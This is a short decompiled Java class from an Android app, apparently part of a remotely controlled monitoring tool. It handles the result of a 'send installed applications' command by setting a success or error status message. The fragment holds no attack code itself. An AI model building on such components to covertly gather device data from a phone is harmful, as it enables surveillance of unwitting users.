package com.vvt.appengine.a;

import android.os.ConditionVariable;
import com.vvt.datadeliverymanager.a.a;
import com.vvt.datadeliverymanager.i;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

class bh
  implements a
{
  bh(bg parambg) {}
  
  public void a(i parami) {}
  
  public void b(i parami)
  {
    boolean bool1 = parami.f();
    RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage;
    boolean bool2;
    String str;
    if (bool1)
    {
      localRmtCtrlOutputStatusMessage = bg.a(this.a);
      bool2 = true;
      localRmtCtrlOutputStatusMessage.setSuccess(bool2);
      localRmtCtrlOutputStatusMessage = bg.a(this.a);
      str = "Send installed applications command is complete.";
      localRmtCtrlOutputStatusMessage.setMessage(str);
    }
    for (;;)
    {
      bg.b(this.a).open();
      return;
      localRmtCtrlOutputStatusMessage = bg.a(this.a);
      bool2 = false;
      localRmtCtrlOutputStatusMessage.setSuccess(false);
      localRmtCtrlOutputStatusMessage = bg.a(this.a);
      str = parami.e();
      localRmtCtrlOutputStatusMessage.setMessage(str);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bh.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */